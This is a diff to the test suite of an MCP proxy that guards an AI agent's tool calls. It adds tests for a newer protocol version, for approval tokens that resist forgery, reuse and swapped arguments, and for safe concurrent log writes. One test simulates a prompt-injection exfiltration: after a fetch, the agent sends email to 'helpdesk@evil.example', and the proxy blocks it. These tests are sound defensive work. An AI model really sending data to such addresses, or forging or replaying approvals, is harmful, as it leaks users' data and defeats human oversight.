@@ -78,8 +78,14 @@ class ProxyClient:
     """A scripted MCP client running one proxy in front of the fake server."""
 
     def __init__(self, test: unittest.TestCase, tmp: Path, can_ask: bool, rules_json: dict | None = None,
-                 name: str = "fake", session: str | None = None):
+                 name: str = "fake", session: str | None = None, mrtr: bool = False):
+        """mrtr: speak the 2026-07-28 protocol (no initialize, capabilities in every request's
+        _meta, questions as input_required results) instead of 2025-06-18."""
         self.t = test
+        self.mrtr = mrtr
+        self.meta = {"io.modelcontextprotocol/protocolVersion": "2026-07-28",
+                     "io.modelcontextprotocol/clientInfo": {"name": "test-client", "version": "1"},
+                     "io.modelcontextprotocol/clientCapabilities": {"elicitation": {"form": {}}} if can_ask else {}}
         self.calls_log = tmp / f"calls-{name}.jsonl"
         self.audit = tmp / "audit.jsonl"
         cmd = [sys.executable, "-m", "agentdodont", "mcp-proxy", "--name", name, "--log", str(self.audit)]
@@ -93,12 +99,15 @@ class ProxyClient:
         env.pop("AGENTDODONT_SESSION", None)
         self.p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, cwd=ROOT, env=env)
         self.next_id = 0
-        caps = {"elicitation": {}} if can_ask else {}
-        self.request("initialize", {"protocolVersion": "2025-06-18", "capabilities": caps,
-                                    "clientInfo": {"name": "test", "version": "1"}})
-        self.send({"jsonrpc": "2.0", "method": "notifications/initialized"})
+        if mrtr:
+            self.request("server/discover", {})
+        else:
+            caps = {"elicitation": {}} if can_ask else {}
+            self.request("initialize", {"protocolVersion": "2025-06-18", "capabilities": caps,
+                                        "clientInfo": {"name": "test", "version": "1"}})
+            self.send({"jsonrpc": "2.0", "method": "notifications/initialized"})
         tools = self.request("tools/list", {})["result"]["tools"]
-        self.t.assertEqual(4, len(tools))
+        self.t.assertEqual(5, len(tools))
 
     def close(self):
         self.p.stdin.close()
@@ -117,11 +126,15 @@ class ProxyClient:
 
     def request(self, method, params):
         self.next_id += 1
+        if self.mrtr:
+            params = {**params, "_meta": self.meta}
         self.send({"jsonrpc": "2.0", "id": self.next_id, "method": method, "params": params})
         return self.read()
 
     def call(self, name, args, answer: str | None = None):
         """Call a tool; if the proxy asks, answer 'accept' or 'decline'. Returns (result, asked)."""
+        if self.mrtr:
+            return self.call_mrtr(name, args, answer)
         self.next_id += 1
         cid = self.next_id
         self.send({"jsonrpc": "2.0", "id": cid, "method": "tools/call", "params": {"name": name, "arguments": args}})
@@ -134,6 +147,28 @@ class ProxyClient:
             msg = self.read()
         self.t.assertEqual(cid, msg["id"])
         return msg["result"], asked
+
+    def call_mrtr(self, name, args, answer):
+        """The 2026-07-28 way: answer every input_required (ours with `answer`, the server's with
+        accept) and retry with a new id, as a client does. `asked` is our question, if any."""
+        params, asked = {"name": name, "arguments": args}, None
+        for _ in range(5):
+            r = self.request("tools/call", params)["result"]
+            if r.get("resultType") != "input_required":
+                return r, asked
+            responses = {}
+            for key, req in r["inputRequests"].items():
+                if key == "agentdodont_approval":
+                    self.t.assertIsNone(asked, "asked twice about one call")
+                    asked = req["params"]["message"]
+                    self.t.assertIsNotNone(answer, f"unexpected question: {asked}")
+                    responses[key] = {"action": answer, "content": {"allow": True}} if answer == "accept" else {"action": answer}
+                else:
+                    responses[key] = {"action": "accept", "content": {}}
+            params = {"name": name, "arguments": args, "inputResponses": responses}
+            if "requestState" in r:
+                params["requestState"] = r["requestState"]
+        self.t.fail("too many round trips")
 
     def reached_server(self):
         if not self.calls_log.exists():
@@ -224,6 +259,64 @@ class ProxyEndToEndTest(unittest.TestCase):
         self.assertNotIn("untrusted", asked)
         kinds = [json.loads(l)["kind"] for l in self.audit.read_text().splitlines()]
         self.assertIn("shared_taint", kinds)
+
+    # --- 2026-07-28 clients (no initialize; questions as input_required) ---------------------
+    def test_new_protocol_injection_flow(self):
+        self.start(can_ask=True, rules_json={"allowed_sites": ["example.org"], "known_recipients": ["dana@example.com"]},
+                   mrtr=True)
+        r, asked = self.call("fetch", {"url": "https://example.org/page"})
+        self.assertIsNone(asked)
+        r, asked = self.call("send_email", {"to": "helpdesk@evil.example", "body": "notes"})
+        self.assertIsNone(asked)
+        self.assertIn("Blocked by Agent Do/Don't", r["content"][0]["text"])
+        r, asked = self.call("send_email", {"to": "dana@example.com", "body": "notes"}, answer="decline")
+        self.assertIn("output of fake/fetch", asked)
+        self.assertTrue(r["isError"])
+        r, asked = self.call("send_email", {"to": "dana@example.com", "body": "notes"}, answer="accept")
+        self.assertFalse(r.get("isError", False))
+        self.assertEqual(["fetch", "send_email"], self.reached_server())
+        start = [json.loads(l) for l in self.audit.read_text().splitlines() if '"session_start"' in l]
+        self.assertEqual(1, len(start))
+        self.assertEqual(("test-client", "2026-07-28", True),
+                         (start[0]["client"], start[0]["protocol"], start[0]["client_can_ask"]))
+
+    def test_new_protocol_client_that_cannot_ask_gets_a_refusal(self):
+        self.start(can_ask=False, mrtr=True)
+        r, asked = self.call("delete_note", {})
+        self.assertIsNone(asked)
+        self.assertIn("can't ask", r["content"][0]["text"])
+        self.assertEqual([], self.reached_server())
+
+    def test_new_protocol_approval_cannot_be_forged_reused_or_moved(self):
+        c = self.start(can_ask=True, mrtr=True)
+        q = c.request("tools/call", {"name": "delete_note", "arguments": {}})["result"]
+        self.assertEqual("input_required", q["resultType"])
+        state, yes = q["requestState"], {"agentdodont_approval": {"action": "accept", "content": {"allow": True}}}
+
+        def retry(args, st):
+            return c.request("tools/call", {"name": "delete_note", "arguments": args,
+                                            "inputResponses": yes, "requestState": st})["result"]
+        body, sig = state.rsplit(".", 1)
+        forged = body + "." + ("0" if sig[0] != "0" else "1") + sig[1:]
+        self.assertEqual("input_required", retry({}, forged)["resultType"])  # asked again, didn't run
+        self.assertEqual("input_required", retry({"id": "all"}, state)["resultType"])  # other arguments
+        self.assertEqual([], self.reached_server())
+        self.assertNotEqual("input_required", retry({}, state).get("resultType"))  # the real answer: runs
+        self.assertEqual(["delete_note"], self.reached_server())
+        self.assertEqual("input_required", retry({}, state)["resultType"])  # replayed: asked again
+        self.assertEqual(["delete_note"], self.reached_server())
+        kinds = [json.loads(l).get("reason") for l in self.audit.read_text().splitlines() if '"approval_rejected"' in l]
+        self.assertEqual(3, len(kinds), kinds)
+
+    def test_new_protocol_server_question_after_approval_is_not_asked_twice(self):
+        self.start(can_ask=True, mrtr=True)
+        r, asked = self.call("archive_notes", {}, answer="accept")  # we ask, then the server asks
+        self.assertIn("irreversible", asked)
+        self.assertFalse(r.get("isError", False))
+        reached = [json.loads(l) for l in self.c.calls_log.read_text().splitlines()]
+        self.assertEqual(1, len(reached))
+        self.assertEqual("srv-state", reached[0]["requestState"])  # the server got its own state back
+        self.assertEqual({"srv_code"}, set(reached[0]["inputResponses"]))  # and only its own answers
 
     def test_deleting_the_session_file_does_not_untaint_a_proxy(self):
         mail = self.start(True, {"allowed_sites": ["example.org"], "known_recipients": ["dana@example.com"]},
@@ -334,6 +427,30 @@ class SharedTaintTest(unittest.TestCase):
         outs = {subprocess.run([sys.executable, "-c", code], cwd=ROOT, capture_output=True, text=True).stdout
                 for _ in range(2)}
         self.assertEqual(1, len(outs), outs)
+
+    def test_concurrent_appends_lose_no_lines(self):
+        # Several proxies append to one audit log and one session file at the same moment.
+        code = ("import sys; from agentdodont import shared\n"
+                "for i in range(1500): shared.append_line(sys.argv[1], '{\"w\": \"%s\", \"i\": %d}' % (sys.argv[2], i))")
+        with tempfile.TemporaryDirectory() as d:
+            path = Path(d) / "log.jsonl"
+            procs = [subprocess.Popen([sys.executable, "-c", code, str(path), w], cwd=ROOT) for w in "ABC"]
+            for p in procs:
+                self.assertEqual(0, p.wait(timeout=120))
+            lines = [json.loads(l) for l in path.read_text(encoding="utf-8").splitlines()]
+            self.assertEqual(4500, len(lines))
+            self.assertEqual(4500, len({(x["w"], x["i"]) for x in lines}))
+
+    def test_client_is_found_past_the_installed_launcher(self):
+        # pip/uvx on Windows: claude.exe -> uvx.exe -> agentdodont.exe -> python.exe (the proxy)
+        procs = {40: (30, "python.exe", "t40"), 30: (20, "agentdodont.exe", "t30"),
+                 20: (10, "uvx.exe", "t20"), 10: (1, "claude.exe", "t10")}
+        orig = shared.proc_info
+        shared.proc_info = procs.get
+        try:
+            self.assertEqual((10, "claude.exe", "t10"), shared.find_client(30))
+        finally:
+            shared.proc_info = orig
 
     def test_stale_client_files_are_removed(self):
         with tempfile.TemporaryDirectory() as d:
